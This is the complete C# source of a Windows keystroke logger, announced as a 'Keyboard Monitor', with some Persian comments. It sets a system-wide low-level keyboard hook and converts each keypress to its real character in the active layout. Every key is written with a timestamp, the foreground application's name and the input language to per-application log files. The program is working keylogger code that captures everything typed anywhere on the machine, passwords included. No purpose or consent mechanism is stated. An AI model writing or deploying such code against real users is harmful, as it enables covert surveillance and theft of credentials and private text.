using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class Program
{
    // ==============================
    // Hook constants
    // ==============================
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    // ==============================
    // WinAPI
    // ==============================

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(
        int idHook,
        LowLevelKeyboardProc lpfn,
        IntPtr hMod,
        uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(
        IntPtr hhk,
        int nCode,
        IntPtr wParam,
        IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(
        IntPtr hWnd,
        out uint processId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags,
        IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode,
        IntPtr wParam,
        IntPtr lParam);

    // ==============================
    // Main
    // ==============================
    static void Main()
    {
        Console.WriteLine("Keyboard Monitor Started...");
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(
                WH_KEYBOARD_LL,
                proc,
                GetModuleHandle(curModule.ModuleName),
                0);
        }
    }

    // ==============================
    // Keyboard callback
    // ==============================
    private static IntPtr HookCallback(
        int nCode,
        IntPtr wParam,
        IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            string appName = GetActiveProcessName();
            string language = GetCurrentKeyboardLanguage();

            // گرفتن Layout واقعی
            IntPtr hwnd = GetForegroundWindow();
            uint threadId = GetWindowThreadProcessId(hwnd, out _);
            IntPtr hkl = GetKeyboardLayout(threadId);

            // تبدیل VK به کاراکتر واقعی
            string key = VkToChar(vkCode, hkl);

            LogToFile(appName, language, key);
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // ==============================
    // Helpers
    // ==============================

    private static string GetActiveProcessName()
    {
        IntPtr hwnd = GetForegroundWindow();
        GetWindowThreadProcessId(hwnd, out uint pid);
        return Process.GetProcessById((int)pid).ProcessName;
    }

    private static string GetCurrentKeyboardLanguage()
    {
        IntPtr hwnd = GetForegroundWindow();
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        IntPtr hkl = GetKeyboardLayout(threadId);
        int langId = hkl.ToInt32() & 0xFFFF;
        return new System.Globalization.CultureInfo(langId).Name;
    }

    // ==============================
    // VK → Real Character
    // ==============================
    private static string VkToChar(int vkCode, IntPtr hkl)
    {
        // کلیدهای خاص
        if (vkCode == (int)Keys.Space) return "Space";
        if (vkCode == (int)Keys.Enter) return "Enter";
        if (vkCode == (int)Keys.Back) return "Backspace";
        if (vkCode == (int)Keys.Tab) return "Tab";

        byte[] keyboardState = new byte[256];
        GetKeyboardState(keyboardState);

        uint scanCode = MapVirtualKey((uint)vkCode, 0);
        StringBuilder sb = new StringBuilder(10);

        int result = ToUnicodeEx(
            (uint)vkCode,
            scanCode,
            keyboardState,
            sb,
            sb.Capacity,
            0,
            hkl);

        if (result > 0)
            return sb.ToString();

        return ((Keys)vkCode).ToString();
    }

    // ==============================
    // File logger
    // ==============================
    private static void LogToFile(
        string appName,
        string language,
        string key)
    {
        Directory.CreateDirectory("Logs");
        string filePath = Path.Combine("Logs", appName + ".txt");

        File.AppendAllText(
            filePath,
            $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{language}] {key}\n",
            Encoding.UTF8);
    }
}
